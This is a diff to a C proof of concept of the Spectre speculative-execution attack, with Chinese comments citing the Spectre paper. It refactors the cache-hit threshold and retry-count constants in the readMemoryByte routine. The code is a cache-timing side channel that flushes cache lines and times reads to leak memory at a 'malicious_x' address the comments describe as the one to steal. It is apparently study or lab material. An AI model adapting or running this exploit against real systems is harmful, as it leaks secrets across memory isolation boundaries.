@@ -3,6 +3,12 @@
 #include <string.h>
 #include <x86intrin.h> /* for rdtscp and clflush */
 
+#define CACHE_HIT_THRESHOLD 80 /* assume cache hit if time <= threshold */
+#define PAGE_NUM 256
+#define PAGE_SIZE 4096
+#define TRIES 1000
+
+
 //受害者
 unsigned int array1_size = 16;
 uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
@@ -21,7 +27,6 @@ void victim_function(size_t x)
 
 //本函数来自论文Spectre Attacks: Exploiting Speculative Execution
 //此阈值可以调整，但是在本机中不可低于40
-#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
 
 //malicious_x是目的地址，即将要窃取的地址
 //value[0]表示猜测值最高的，score[0]为其得分
@@ -37,7 +42,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 
 	for (i = 0; i < 256; i++)
 		results[i] = 0;
-	for (tries = 999; tries > 0; tries--)
+		
+	for (tries = TRIES; tries > 0; tries--)
 	{
 		//flush array2[(0-255)*512]
 		for (i = 0; i < 256; i++)
